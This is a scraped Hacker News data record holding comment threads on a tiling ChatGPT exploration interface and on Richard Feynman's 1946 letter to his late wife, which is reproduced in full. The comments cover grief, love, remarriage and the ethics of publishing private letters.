https://old.reddit.com/r/youtube/comments/1bro66c/videos_vib... reply bouke 2 hours agoparentprevYou can turn the haptic feedback off in the app, which is what I did. It doesnâ€™t convey useful feedback, just lain annoying. reply goosethe 3 hours agoprevI'd love it if it had a \"zoomed out\" tree-like view that makes all the different paths of conversation viewable at once reply ChaitanyaSai 3 hours agoparentThat's sort of a mind map. We are building/experimenting with something like this . https://iwtlnow.microschools.in/ You can either enter your GPT key, or fill in the form here https://learn.microschools.in/ and we'll give you access if you'd like to give it a spin. reply mritchie712 3 hours agoparentprevtldraw (make real) is close to this, but on a canvas: https://news.ycombinator.com/item?id=38288130 reply yaj54 1 hour agoprevawesome work! I've wanted to explore the same idea - glad to see it getting worked on. The chat interface into language models clearly works but it frequently feels like an inefficient way to explore the latent knowledge space of the model. Hypertext (the www) has also been shown to be a great way to explore a massive knowledge space. What this is doing is applying something like a hypertext layer as a way to navigate the model's latent space. Very cool. It could become something of a dynamically generated personalized wikipedia. I'm curious what the prompts look like that you are using to generate subsequent \"pages\". It could be as simple as \"write a wikipedia style summary of \" but I think there is a lot of potential in including the context of my current \"rabbit hole\": \"explainin the context ofwith a learning goal of \", etc. Another idea: grounding this kind of hypertext exploration with rag on a specific dataset, e.g., wikipedia or hn. reply skadamat 3 hours agoprevReminds me of Andy Matuschak's UI as well: https://notes.andymatuschak.org/z9C7piFz8mthkGUUd1W2CR?stack... reply iknownthing 4 hours agoprevAre you paying for the API calls yourself here? reply maxkrieger 1 hour agoparentI have a lot of OpenAI API credits to use by end of the month, so Iâ€™m using 4o. Iâ€™ll probably switch to a more sustainable model afterwards, consider this a request for API credits, all! Emailâ€™s on website :) reply Falimonda 4 hours agoparentprevIt seems like they're caching information/replies on key words which is a good optimization. reply iknownthing 4 hours agorootparentI assumed it was coming straight from the API because of the token-by-token generation effect but maybe you're right. reply rodiger 2 hours agorootparentThe token-by-token responses are probably API, while the \"instant\" loads seem to be cached. Probably using groq based on speed of response reply brandonhorst 4 hours agoprevI really love this. A book was recommended to me that I'm not going to have time to read, but this UI is an amazing way to figure out the main ideas and dive deeper into the interesting ones. No idea if the things it's telling me are true or not, but that doesn't matter quite as much in this case. reply jhardy54 3 hours agoparentWhich book? reply yungtriggz 3 hours agoprevThis is really cool! I love the rabbit hole stuff you can do when you give GPT more capabilities. I was playing around with this stuff and found I was most often wanting to use it when wanting to learn about something so made Instaclass: https://myinstaclass.com/. It finds videos, images, makes quizzes and gets more relevant web links for you to keep exploring, and structures it like a class (basically a list of bullet points like you mentioned). Try it out and lmk what you think! reply telesilla 3 hours agoprevThis is fantastic, like an encyclopedia that knows what context you are learning about as you skip pages. Nice work! My minor recommendation is to highlight somehow that the input fields accepts any topic and the suggestions are just random try-it-out topics, it's wasn't immediately clear. Instead of 'write a message' it could say maybe, 'enter a topic to learn about'. reply blixt 4 hours agoprevReally fun! I realized each delve carries the context of the previous ones. So I got to StarCraft II from the initial example of \"Faster language models\", but it mostly talked about how SC2 can be used for reinforcement learning. It'd be nice to have a key I can hold down to start a new delve on the topic (bonus points if you can stack multiple delves so you can keep going deeper on the old track as well!) Another thing that would be interesting is if there was minimal markup for the LLM to indicate \"here should be an image of [search term]\" or maybe even interactive code blocks etc. But obviously this is scope creep deluxe. reply rvnx 5 hours agoprevYou may find interesting to look at Google's AI Kitchen and the early versions of Bard (the LaMDA version) because they were specifically optimizing user scenarios where the user wants bullet points (though intuitively, your tool seems already much better than what Google did). reply dinkleberg 3 hours agoprevNice work, this is really solid! I've had something like this on my mind for a while. I really think there are some great use cases for AI around supporting/enhancing human cognition rather than trying to outsource our thinking. In this case of this, being able to rapidly \"expand\" your working memory with whatever is present in these cards is promising. I look forward to seeing what you do with this. reply atentaten 1 hour agoprevThis made me chuckle with delight once I understood what it was doing. reply cjf101 2 hours agoprevI dig this. Reminds me of column mode in MacOS's finder, which is similarly helpful in \"rewinding\" an exploration of a file system. Would be interesting to rabbit other rabbit hole resources like Wikipedia or IMDB in this way too. reply follower 1 hour agoparent> column mode in MacOS's finder FWIW these are known as \"Miller columns\" if anyone wants to research the topic further: https://en.wikipedia.org/wiki/Miller_columns reply wordpad25 3 hours agoprevHow does it work? Are hyperlinks generated as part of original prompt or you do post processing on a response with another LLM? reply jackphilson 1 hour agoprevHow to combine the learning efficiency of this with the structure of a textbook? reply spacebacon 3 hours agoprevFor coding it would be nice to add task to links. So when a link is clicked you could simply choose to follow it or create a new agent with the link. Each agent will tune the output as one goes down the rabbit hole. reply kaladin_1 2 hours agoprevFirst impression, a fast and neat interface. I went into data indexing rabbit hole as that has been my obsession these days. Cudos! Particularly impressed with the lack of clutter and the speed. reply aaronharnly 4 hours agoprevThis is fun! It feels like infinite hyperlinks. It's the kind of wonder I had in exploring Wikipedia for the first time. reply jmkni 1 hour agoprevVery nice idea, hope it's not costing you a fortune to run! Maybe let us put in our own api keys? reply andrewmutz 3 hours agoprevUI is very clean. Left right scroll is awkward without a trackpad, however reply davedx 4 hours agoprevI REALLY like how snappy it is. I've always been impressed with how fast Wikipedia managed to stay over the years, but this is even better. Really nice work. reply nkotov 2 hours agoprevI love the experience. It's almost like a mind map that keeps getting better and better. reply aster0id 3 hours agoprevLove this. It would really benefit from a back/forward button though! reply jpcookie 4 hours agoprevI love how it feels like obsidian reply sunbum 3 hours agoprevI just get a lightblue screen (Firefox Windows 11) reply robertlagrant 4 hours agoprevWarning: if you plug this into tvtropes then global productivity will drop sharply. reply jpcookie 4 hours agoparent? reply firtoz 3 hours agorootparentIt's a meme, because tvtropes is insanely addictive to dive deeper into the various rabbit holes it has. If you enable this kind of rabbitholing it'll be even more insanely addictive because of how awesome it feels to explore rabbit holes. reply toisanji 5 hours agoprevsome feedback: * can you make it so we can share links of sessions? * can you describe on the homepage or in a link from the homepage what it does. reply mariocesar 5 hours agoparentYes, +1 to sharing links! I'll also add: * Enable the use of personal OpenAI API keys. * Include system prompts, such as \"If the topic is about X, highlight new topics by Y\" and \"Reply to all as if explaining the topic to a 6-year-old.\" * Backlink to the original thread when the same topics are found. * It would be great if this could be a desktop app with all answers saved locally, creating \"my own personal\" infinite wiki. reply SubiculumCode 1 hour agoprevThis is pretty neat. What I really like is the tiling layout. I subscribe to phind, which provides a nice search/answer service, which also suggests followup questions, which works fairly well: https://imgur.com/a/WfHSzdk But if it was in a tiling format, that would be pretty awesome for the flow, especially on mobile. reply byyoung3 1 hour agoprevthis UI feels right. reply sergiotapia 3 hours agoprevcrrriispy ui dude. This is like that custom prompt people were sharing for gpt where it would preempt three relevant follow up questions. what heuristic are you using for making words clickable? i recommend making the links just hardcode old-school blue and purple. make it obvious you can click these things. \"dive on in\" https://www.youtube.com/watch?v=DElxVXS7PD0 reply jpcookie 4 hours agoprev [â€“] Source code? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The interface converts the rabbit-holing process into a tiling layout, allowing users to explore topics through generated hyperlink-prompts.",
      "Upcoming features will include sessions, sharing capabilities, enhanced navigation, highlight-to-delve functionality, and image integration.",
      "The developers are seeking feedback on additional use cases and ideas for further improvement."
    ],
    "commentSummary": [
      "Maxkrieger introduced a new ChatGPT interface on a9.io, featuring a tiling layout that enhances topic exploration through hyperlink-prompts generated by the model.",
      "The design aims to improve the user experience of large language models (LLMs) by preventing the reopening of already explored topics and is likened to navigating Wikipedia.",
      "Users praise the clean, fast, and engaging interface, suggesting enhancements like better link visibility, session management, a tree layout for navigation, manual word highlighting, and a zoomable canvas, with potential educational applications noted."
    ],
    "points": 356,
    "commentCount": 87,
    "retryCount": 0,
    "time": 1717071755
  },
  {
    "id": 40521963,
    "title": "Richard Feynman's Unopened Love Letter to Late Wife Revealed After His Death",
    "originLink": "https://lettersofnote.com/2012/02/15/i-love-my-wife-my-wife-is-dead/",
    "originBody": "Wednesday, 15 February 2012 I love my wife. My wife is dead. Richard Feynman was one of the best-known and most influential physicists of his generation. In the 1940s, he played a part in the development of the atomic bomb; in 1986, as a key member of the Rogers Commission, he investigated the Space Shuttle Challenger disaster and identified its cause; in 1965, he and two colleagues were awarded the Nobel Prize â€œfor their fundamental work in quantum electrodynamics, with deep-ploughing consequences for the physics of elementary particles.â€ He was also an incredibly likeable character, and made countless other advances in his field, the complexities of which I will never be able understand. In June of 1945, his wife and high-school sweetheart, Arline, passed away after succumbing to tuberculosis. She was 25-years-old. 16 months later, in October of 1946, Richard wrote his late wife a heartbreaking love letter and sealed it in an envelope. It remained unopened until after his death in 1988. (This letter, along with 124 other fascinating pieces of correspondence, can be found in the bestselling book, Letters of Note. Reproduced with permission of Richard Feynmanâ€™s Estate.) The Letter October 17, 1946 Dâ€™Arline, I adore you, sweetheart. I know how much you like to hear that â€” but I donâ€™t only write it because you like it â€” I write it because it makes me warm all over inside to write it to you. It is such a terribly long time since I last wrote to you â€” almost two years but I know youâ€™ll excuse me because you understand how I am, stubborn and realistic; and I thought there was no sense to writing. But now I know my darling wife that it is right to do what I have delayed in doing, and that I have done so much in the past. I want to tell you I love you. I want to love you. I always will love you. I find it hard to understand in my mind what it means to love you after you are dead â€” but I still want to comfort and take care of you â€” and I want you to love me and care for me. I want to have problems to discuss with you â€” I want to do little projects with you. I never thought until just now that we can do that. What should we do. We started to learn to make clothes together â€” or learn Chinese â€” or getting a movie projector. Canâ€™t I do something now? No. I am alone without you and you were the â€œidea-womanâ€ and general instigator of all our wild adventures. When you were sick you worried because you could not give me something that you wanted to and thought I needed. You neednâ€™t have worried. Just as I told you then there was no real need because I loved you in so many ways so much. And now it is clearly even more true â€” you can give me nothing now yet I love you so that you stand in my way of loving anyone else â€” but I want you to stand there. You, dead, are so much better than anyone else alive. I know you will assure me that I am foolish and that you want me to have full happiness and donâ€™t want to be in my way. Iâ€™ll bet you are surprised that I donâ€™t even have a girlfriend (except you, sweetheart) after two years. But you canâ€™t help it, darling, nor can I â€” I donâ€™t understand it, for I have met many girls and very nice ones and I donâ€™t want to remain alone â€” but in two or three meetings they all seem ashes. You only are left to me. You are real. My darling wife, I do adore you. I love my wife. My wife is dead. Rich. PS Please excuse my not mailing this â€” but I donâ€™t know your new address. Share this: Click to email a link to a friend (Opens in new window) Click to share on Twitter (Opens in new window) Click to share on Facebook (Opens in new window) Click to share on Tumblr (Opens in new window) Related letters I see you, my beauty boy For two months in 1974, as Richard Burton filmed his part in The Klansman, he and his wife, Elizabeth Taylor, moved to California with Cassius, just one of Taylor's many beloved cats. Sadly, the trip confused Cassius somewhat and he soon went missing, never to return. Taylor wrote the following letterâ€¦ December 6, 2013 Similar post I shall always be near you In 1861, as the American Civil War approached, a 32-year-old lawyer named Sullivan Ballou left his wife of five years and two sons at home, and joined the war effort as a major in the Union Army. On July 14th of that year, acutely aware that particularly perilous times wereâ€¦ February 9, 2012 In \"Love\" Permission to land Top-left: A Huey thrown overboard; Top-right: Buang-Ly lands safely; Bottom: A rapturous welcomeOn April 30th of 1975, with the Vietnam War coming to a close and the U.S. evacuating as many people as possible from South Vietnam in Operation Frequent Wind, crew aboard the USS Midway were surprised to see a smallâ€¦ March 21, 2011 In \"Request\"",
    "commentLink": "https://news.ycombinator.com/item?id=40521963",
    "commentBody": "I love my wife. My wife is dead (1946) (lettersofnote.com)282 points by tu7001 8 hours agohidepastfavorite75 comments strenholme 8 hours agoMy wife died 10 years ago, so I understand that pain. Dealing with death is never easy. The thing I miss most about my wife is the depth of emotional connection; she knew everything about me being very deeply in love with me and everything I did really mattered to her. It has taken me nearly 10 years to build a network of friends who can give me comparable levels of socialization and attention; I have about two dozen very close friends (both male and female) across the world now and itâ€™s finally enough to replace the hole in my life I had which my wife used to fill. I can see why Feynman became sexually promiscuous afterwards, undoubtedly to numb the pain of losing his wife; seduction allowed him to have a form of that connection, albeit without the depth and love of what he had with his wife. While that path looked appealing to me, I do not regret avoiding that temptation. reply kgwgk 7 hours agoparent> I can see why Feynman became sexually promiscuous afterwards, undoubtedly to numb the pain of losing his wife; seduction allowed him to have a form of that connection, albeit without the depth and love of what he had with his wife. He married again in 1952 and divorced in 1958 (and married again a couple of years later). I don't know if sexual promiscuity was part of the divorce complaint but apparently this fragment was in it: \"He begins working calculus problems in his head as soon as he awakens. He did calculus while driving in his car, while sitting in the living room, and while lying in bed at night.\" reply jebarker 7 hours agorootparentAfter reading lots of biographical material on Feynman it seems like he was a very loving father and husband (especially to his first wife) but obviously devoted to physics. I would imagine it's very difficult to find the balance between his kind of career and family such that the family feels they get sufficient attention. reply nequo 6 hours agorootparentItâ€™s difficult when you want to live three lives in one human lifetime, and academia is one of those careers where that might happen to you. reply sharadov 2 hours agoparentprevI am so happy that you were able to build that emotional connection. My dad is terminally ill and often I think about what I will miss most when he is no more. And I realized it would be the depth of emotional connection - a person who knows you in and out and unconditionally loves you. I try to steel myself about the coming eventuality, but all I know is it's going to be a deep abyss and it will take everything to climb out of it. reply throwaway64643 4 hours agoparentprevI always felt a sense of betrayal when someone sought a new partner after their spouse dies. But when I read a passage by Freeman Dyson about Feynman's trip to Santa Fe to meet his new girlfriend, my view has significantly shifted. Dyson (or perhaps someone else; I don't recall exactly) spoke of Feynman as someone who cannot stay out of a romantic relationship for too long. Some men just always want to love and be loved. reply criddell 1 hour agorootparentIf you die before your partner, do you want them to remain single the rest of their lives? If that were to happen to me, I definitely want my wife to love and be loved again. reply tasuki 3 hours agorootparentprev> I always felt a sense of betrayal when someone sought a new partner after their spouse dies. Why? reply jhbadger 2 hours agorootparentright? I mean even the traditional marriage vows (which given the possibility of divorce aren't really to be taken literally) include the phrase \"until death do us part\", implying that you are free to find somebody else once your partner has died. reply card_zero 7 hours agoparentprevNice to know that mere friendship (in heavy doses) can do the same job. I thought this should be possible, but was worried it might not be. reply 01HNNWZ0MV43FF 6 hours agorootparentIt might depend on the person. I want in-person friendships and 24 people sounds like more than I could reasonably give attention to. And I want non-platonic things reply lisper 2 hours agoparentprevIMHO, it's not promiscuity that is morally questionable, its promiscuity without the informed consent of all parties involved. Feynman had affairs with married women (presumably without their husbands' knowledge or consent) and students, over whom he held power and whose consent (assuming they did consent) cannot have been free from coercion. (He also flat-out lied to women to get them to sleep with him, which is also not OK.) I think it's important to distinguish these situations because I think there are a lot of people going through a lot of emotional pain because they believe that any sex outside of a long-term monogamous relationship is morally questionable, and it's not. The challenge is that insuring that all parties have given informed consent is hard, but the emotional toll of throwing in the towel on this can be pretty high, so I think it can be an effort worth making. Certainly it's worthwhile telling people that it's OK to try. reply cyberlurker 7 hours agoparentprevI mean this seriously. Why not both? I donâ€™t see the problem with having multiple types of relationships with people, including sex. As long as everyone is on the same page (consensual, they know itâ€™s casual, etc.) Sorry for your loss and glad youâ€™re doing better. reply mycologos 7 hours agorootparentI don't think strenholme is saying that those casual relationships are morally wrong, but that they're only facsimiles of the connection found in a deep and long relationship (especially one formed when young), and that pursuing facsimiles maybe brings you close enough to the original that you keep pursuing, but not close enough to ever approximate the original, and if what you miss is the original, then this is not a path to satisfaction. reply graemep 4 hours agorootparentInteresting point, but surely the reasoning that they are \"only facsimiles of the connection found in a deep and long relationship\" is a major argument for regarding them as morally wrong? If you believe you have a moral duty to be the best person you can then passing up that opportunity in favour of the facsimiles is morally wrong. reply mycologos 4 hours agorootparent> If you believe you have a moral duty to be the best person you can then passing up that opportunity in favour of the facsimiles is morally wrong Maybe a better statement would be that casual connections only offer facsimiles of the depth of a deep and long relationship, because the sheer accumulation of time and experiences with another person cannot be replaced quickly. However, you can also say that a deep and long relationship only offers a facsimile of the breadth of many shorter relationships, as one person can only offer so many things. If you change your passionate pursuit every decade, finding a partner with the same one each time might make that pursuit more fruitful. It's not how I personally feel, but \"best person\" is subjective like that. reply nathan_compton 3 hours agorootparentprevI don't think this follows unless you think there is something particularly special about sexual relations per se. I'm monogamous but I don't see why people should avoid casual sex. reply WarOnPrivacy 3 hours agorootparentprev> Why not both? I donâ€™t see the problem with having multiple types of relationships with people, including sex. May I suggest retiring to The Villages in FL? They seem to have the multiple partners thing worked out. https://duckduckgo.com/?hps=1&q=the+villages+florida+sex&ia=... reply MrDresden 7 hours agoprevHalf way through reading that, I stopped and sent my partner a message telling them how much I love and respect them. They have recently passed the 5 year survival mark after a cancer diagnosis and treatment, and are coming up on 3 years for their second different cancer diagnosis and treatment. None of us knows how much time we have ourselves or with our loved ones, so make the most of it in the moment. reply dang 5 hours agoprevReposts are fine after a year or so but this topic had a major thread within the last year, so the current post counts as a dupe by HN's standard. See https://news.ycombinator.com/newsfaq.html. Love after life: Richard Feynman's letter to his departed wife (2017) - https://news.ycombinator.com/item?id=37914958 - Oct 2023 (127 comments) Earlier threads, in case of interest: No Other Love: Letters from Richard Feynman to His Late Wife, Arline - https://news.ycombinator.com/item?id=29681462 - Dec 2021 (44 comments) Love After Life: Richard Feynmanâ€™s Letter to His Departed Wife (2017) - https://news.ycombinator.com/item?id=24204678 - Aug 2020 (1 comment) Richard Feynman's Extraordinary Letter to His Departed Wife - https://news.ycombinator.com/item?id=19280764 - March 2019 (12 comments) Feynman's Letter to His Wife - https://news.ycombinator.com/item?id=10375283 - Oct 2015 (60 comments) Richard Feynmanâ€™s Love Letter to His Wife Sixteen Months After Her Death - https://news.ycombinator.com/item?id=7893757 - June 2014 (1 comment) Feynman: I love my wife. My wife is dead. - https://news.ycombinator.com/item?id=4178368 - June 2012 (2 comments) reply patcon 4 hours agoparentREPOSTED from deleted top level comment. @dang I'm seeing that it was posted 7 months ago: https://news.ycombinator.com/item?id=37914958 I appreciate the rules, but am very disappointed. There are some incredibly moving comments in here. I rarely feel as connected to the hacker news community as when reading these comments. The fact that it was erased off the front page for some rigid application of the rules, that leaves me with a bad taste. For your consideration in the next cycle: pls consider valence of comments when determining dupes. If there is either an unfolding of (1) very valuable and new information, or (2) very sincere and vulnerable feelings, people might appreciate your bending the rules. thanks for considering reply em-bee 3 hours agorootparenti agree with this. the problem with duplicates is that they often lead to repeating arguments that have already been hashed out in the previous discussions, and nothing new is being learned by repeating the same discussion after a short time. however, this is only true if the actual content of the article is being discussed, and that is not the case here. we get discussions about loss, depression and other topics in that area every other month or so. and these discussions aren't so much about the articles themselves, but they invite people to share their personal stories that only relate to the article. if it was the same people each time just repeating their stories, then it would make sense to call it a duplicate, but instead these posts open up a space for different people to share and deal with their grief and their struggles, which i think is worthwhile to allow more frequently than duplication rules would permit. reply dang 4 hours agorootparentprevOk, I've turned off the dupe marker on this one. reply UniverseHacker 2 hours agorootparentThank you Dang. I feel this is the right time to bring this discussion back, as HN has recently been having a lot of discussions about love, death, and loss. This discussion really isnâ€™t only about the linked letter. reply solardev 3 hours agorootparentprevThanks for being flexible with the rules! This is the first time I've seen this post, and I appreciated it. reply patcon 3 hours agorootparentprevyou are delightful. i appreciate you, dang reply throw0101c 8 hours agoprevA little longer (76 pages), but A Grief Observed by C.S. Lewis is also worth checking out: * http://www.samizdat.qc.ca/arts/lit/PDFs/GriefObserved_CSL.pd... (Canada public domain) * https://en.wikipedia.org/wiki/A_Grief_Observed * https://www.goodreads.com/book/show/26077627-a-grief-observe... reply dano 2 hours agoparentThis is a worthwhile read. Grief is really not as cut and dried as it's sometimes made out to be. As Lewis came around to understanding, and perhaps Feynman too, we had something special, something grand, and to remember is comforting. reply sampo 8 hours agoprevSomewhat related: http://www.rosenfels.org/Feynman After the war, Feynman got a \"D\" from an army psychological evaluation because he, among other things, told the psychiatrist that he occasionally talks to his late wife. \"Thinks people talk about him. Thinks people stare at him. Auditory hypnogogic hallucinations. Talks to self. Talks to deceased wife.\" reply UniverseHacker 2 hours agoparentItâ€™s incredible that they are so out of touch they see healthy introspection, and love as mental illness. This reminds me of when I had an actual bacterial infection, couldnâ€™t get my Dr to prescribe antibiotics for it, so I got some on my own and they worked. When I pulled my medical records I saw in my chart something like â€œinappropriate off label use of prescription medications.â€ reply therobots927 1 minute agorootparentHow did you acquire the antibiotics? reply redblacktree 2 hours agorootparentprevHow did you pull your medical records? reply UniverseHacker 1 hour agorootparentI believe it's a legal right to request them. I sent them an official form requesting them, and they sent them to me, as I wanted to transfer my old records to a new doctor. These were old style records, nowadays most of that stuff will be automatically on some type of web portal. reply romwell 7 hours agoparentprevWell, people sure do talk about him, he was on point there. That's what we're doing now! And why wouldn't he talk to himself? Clearly it would be a conversation with a much more interesting person than most people around him (and yes, I'm aware he worked on the Manhattan Project and the Challenger investigation). reply coldtea 6 hours agoprevPeople appreciating this letter might also appreciate \"A crow look at me\" by Mount Eerie (a one-person music project), written by Phil just after his wife died of cancer, and dealing with it. Here's an example track: https://genius.com/Mount-eerie-real-death-lyrics reply exitb 54 minutes agoparentJust a note that the album represents a much more raw and unprocessed point of view - I wouldn't recommend it to anyone dealing with a recent loss. reply patcon 3 hours agoparentprevTHANK YOU. I'm listening to this now, and deciding what is appropriate to share with my familyI promise that you will find someone again Yeah, it's not that i fear that i'll be alone forever, i just believe that our connection is very special and strong as we came together as young adults and are now in our mid-twenties, so we kind of bonded and matured together through the pandemic, starting new jobs, getting degrees, going on vacations etc. we've experienced so much together that it'll take quite some time to get to know another person to the same level. And we don't even live together at the moment... In all these years i can't think of a single fight or long-winded argument, if you exclude angryness caused by dehydration or hunger during stressful situations. we've got different skills and personality traits which add up. we've got the same idea on what makes for a comfortable evening or weekend. etc. TL;DR - we're just a very good match. Of course there are aspects where we could match better, but i can only think of one or two small things. reply ozgrakkurt 5 hours agoparentprevThis is not cringe at all IMO. It is the best thing that happened to me by far as well. Having someone to care about each other, feeling love and especially pure trust is really really priceless. Hope you will be happy and together reply 4ggr0 5 hours agorootparentYeah, not sure why i think that others could find it cringe, as you say it's really one of the best things which can happen. Thank you! Same for you, if that \"best thing to happen\" is still going on :) reply nbgoodall 8 hours agoprev\"PS Please excuse my not mailing this â€” but I donâ€™t know your new address.\" That hit hard. reply DoreenMichele 5 hours agoprevRichard Feynman: Physicist and bon vivant. I think that's why he's so interesting to people. He defies the stereotypes we have for a nerdy intellectual that suggests smart people don't know how to have fun or socialize or love...etc. reply mrweasel 8 hours agoprevOn one hand I am happy that we have things like Marcus Aurelius' Meditations, on the other I feel that peoples private and unpublished writings should be kept private. It's reasonable enough to let a limited number of researchers access private documents, but the broader public, no. This isn't a letter meant for us, it's not meant for anyone to read and I feel that publishing it is a little disrespectful. reply Gooblebrai 7 hours agoparentI think that once the author has passed, there's no harm to the publishing. In fact, I'd argue that it shows us true human nature, unfiltered and unedited. If we'd only allowed what was meant to be public, we'd be losing perspective as works meant to be public are carefully crafted for that purpose. reply donatj 7 hours agoparentprevAprÃ¨s moi, le dÃ©luge. After I am dead, publish everything, correspondence, search history, location history, nude photos. I am dead, I cannot care. reply rpigab 7 hours agorootparentYou won't care, but the living will. Funerals aren't meant for the deceased, they allow the living to mourn and move on. It may be irrational fears, but living people often fear what's gonna happen to them after they die, and respect for people extends after they die for most people. Not for everyone, but this means that some will feel uncomfortable about sharing private stuff. And then there's also superstition. reply strken 7 hours agorootparentSpeaking only for myself, it has been invaluable to have access to the private papers of people like my great grandfather. It provides a real connection to a man, time, and place which I couldn't know in person. Perhaps publishing everything is a step too far, but things like semi-private diaries from a war or a voyage --- intended for immediate family to read, but not for publication --- are often okay to publish within living memory of the deceased. Sufficiently chaste love letters seem to me to be okay after a long enough time has elapsed, too. reply nick__m 7 hours agorootparentprevCorrespondences usually involve at least another person so please wait until both side are dead before publishing everything. reply mrweasel 6 hours agorootparentprevIf that is what you wish, then absolutely, publish everything. Where I question the morality is in private correspondence, a persons dairy and things which was explicitly never wanted to be published. There are movies, music and books which the creators specifically withheld from the world. Who are we to determine otherwise. Again I see no issue in researchers combing over half-written books, discarded sheet music or personal notes. I just think we should be respectful and keep things that was deliberately hidden from the world private. If an author leaves a 90% finished book and say they don't want it published, having family or publishers to going ahead, finishing it or publishing it in its half-finished state anyway after the death or the author doesn't sit right with me. That's not to say that something like Feynman letter to his wife isn't beautiful, it is, very much so. It was just not meant for us, it was meant for himself and a woman who would never read it. reply jebarker 7 hours agoparentprevI'm not sure where this letter was first published, but Feynman's daughter edited a book of many of his letters private and professional: https://en.wikipedia.org/wiki/Perfectly_Reasonable_Deviation... I found it very beneficial to read recently so I'm grateful that his family chose to publish. I enjoy \"Letters of Note\" and many of the most impactful letters are personal ones between private individuals. reply karaterobot 5 hours agoparentprevIf anyone believes people have a right to decide what information about them is made public, but believes they lose that right after death, I'd love to hear the argument for that. For me, the basis for accepting the first proposition is that you buy in to self-determination as a value in and of itself, worth respecting not just because the person is around to stop you from doing whatever you want to them. In other words, if they ever had the right to say how they wanted to be treated, why do they lose that right after death? As an example, if Bob one day told you that their name is now Alice, would you say \"got, it Alice!\" then go back to calling them Bob on the day they die? Why not? After all, what do they care, they're dead! To me, this sounds like a variation of the same argument against respecting someone's privacy after death, and bothers me for the same reason. reply smaudet 4 hours agorootparentI think the answer is buried somewhere in the mists of...time. Put another way, there is a temporal degree of respect for the dead, i.e. can you and for how long put the wishes of the dead above those of the living. Of course, for immediate death, as others have noted, there are plenty of \"stakeholders\", family members, etc. who have direct interest in the wishes of the dead being upheld (not having their communications exposed, as others have noted). These needs must be considered, but eventually those grandchildren will also themselves pass, and those stakes will have also vanished. Even for immediate death, the wishes of the dead can be invalid and ir-respected, such as in the case of a suicide bomber or a recently deceased captor/dictator. On the flip side, for those dead (tens of) thousands of years, we engage in a practice known as archeology, that I think you would have a hard time arguing the opposite - the information we glean from their table scraps is too valuable to worry about their death wishes, assuming they had any. In the great in-between, then, the question is, whose wishes matter more? Those of the deceased or those of the living. Usually, those of the living. And it is generally in our interest that we not disturb the dead too much, because at least we would like to live in a society that continues to grow, and does not need to disturb them (too much), respect our own wishes, etc. But ultimately, once it can be said it no longer harms any living, or any future living, then the desires of the living trump the desires of the deceased. reply Staple_Diet 7 hours agoparentprevI agree with the sentiment, but Meditations was always written to be published though. It was less a private journal and more a write-as-you-go self help book. Marcus (Marky to his friends) hoped his writings would be read widely as it would spread his thoughts on stoicism etc. reply begueradj 7 hours agoparentprevPrivacy and decency are weird notions for a lots of people nowadays who rather generate money by disclosing online everything private about their lives. reply Almondsetat 6 hours agoparentprevThis is history. The more we know, the better. If you think it's \"too soon\" then let's wait until his stuff gets dispersed hundreds of years after his death like has happened for every historical figure until recently. I'm sure 2236 historians will love it. reply robviren 7 hours agoprevMan, when the analytical minded come to grips with emotions it always hits hard for me. I love that he reflects on the impractically of his own thoughts and just accepts how he feels. This love letter hits hard reply pard68 3 hours agoprevI sometimes think about what my life would be like if my wife passed away. I'm also a father, and sometimes I wonder what life would be like if I lost my entire family. I think I'd have a hard time finding purpose and would either spiral or would become hyper focused in my career. It is amazing. I had the same \"best friend\" for 20 years, from age 3 until 23, but almost as soon as I set eyes on my wife she became my best friend and became a much deeper and beloved one. I find that much of my motivation in life is because I want the best for her and our children. reply scioto 2 hours agoprevThis reminds me of John Scalzi's early SF book, Old Man's War. One of the MC's motivations throughout the book was the love of his wife. Apart from the pew-pew aspects, it's one of those stories that can hit you in the feels in the appropriate places. Won't say any more since it'd give away too much. reply jb1991 8 hours agoprevI did not know Feynman was responsible for finding the cause of the Challenger explosion. That's remarkable on top of everything else he did. reply scrlk 7 hours agoparentIt's worth reading Feynman's Personal Observations on Reliability of Shuttle, published as part of the Rogers Commission Report. https://www.nasa.gov/history/rogersrep/v2appf.htm > \"For a successful technology, reality must take precedence over public relations, for nature cannot be fooled.\" reply dotnet00 1 hour agoparentprevHe was involved in the investigation committee, but of course wasn't the only one there. IIRC Neil Armstrong was also on the committee. I figure that part of the point of choosing them was to lend the committee credibility with the public. The public would probably trust that the findings were above board if they were supported by the first man on the Moon and one of the most prominent physicists of the time. reply syncsynchalt 1 hour agoparentprevIt has come out more recently (2019) that Sally Ride was putting him on the trail. He acted the irascible dogged investigating scientist, and she got the astronauts' worries about shuttle program specifics out to the public. reply irusensei 8 hours agoprevHaving the feels over an HN post was not in my list today. reply pard68 3 hours agoprevNot a knock on Feynman, but he did re-marry in '52, which ended in divorce a few years later and then married a third time in '60, and stayed married until his death. reply huskdigselv 8 hours agoprevWhat a turbulence of emotions and thoughts this invokes in me; I envy this guys beautiful and rich love for his wife, since I haven't felt similar myself. Simultaneously I also really feel for him and the grief and miss that comes from losing someone you love; I still somewhat often talk to my mother who passed to remind her that I still think of her and out of love. These emotions are ambiguously painful and meaningful. reply LogHouse 5 hours agoprev> You, dead, are so much better than anyone else alive. Beautiful. Leave this mark on someone. reply patcon 5 hours agoprevThis is beautiful. And not just beautiful, but true, I think. I've been working through thoughts about my dead mother the past few months, in concert with a new partner in my life who also lost her mother. We've been working through some thoughts... somewhat related to an information-theoretic view of death. Here's an excerpt of something I wrote on the topic[1] in 2018: > [snip] So anyhow, as Iâ€™m sitting in on this session [about IETF multistakeholder internet governance], and Iâ€™m realizing that what weâ€™re really trying to figure out with internet governance is how to govern a complex system. So itâ€™s perhaps less internet governance, but rather network governance. And so what patterns have we seen in other systems, that deals with this challenge of creating space for new participants, while honouring the history of past participants? > And this lead to some interesting thoughts on the big pattern that often goes unspoken: Death. > ### DEATH IS HEGEMONIC. > It may sound funny to describe death as a pattern. We often talk about it like itâ€™s this fact of existence. And it might as well be. Itâ€™s omnipresent. Pretty much every living thing we know of, dies. It has prevailed in all living networks, through countless iterations. Death is hegemonic. > But what about death might be selected for? How does it benefit the network? Perhaps itâ€™s best to imagine this first at the scale of individual personal relationships. Thatâ€™s simpler, and I believe the reasoning is portable up to larger social scales. > Imagine how we might have moved on from Newtonian physics if that intellectual heavy-weight Newton were still alive and influential within the network. One could imagine that it might be difficult. Newtonâ€™s thinking was clever, but we also understand it to be misguided by todayâ€™s measure. In a world without death, new ideas would have to grapple and contend not just with static ideas and information, but with the dynamic and increasingly stubborn minds that birthed them. (This [stubbornness and 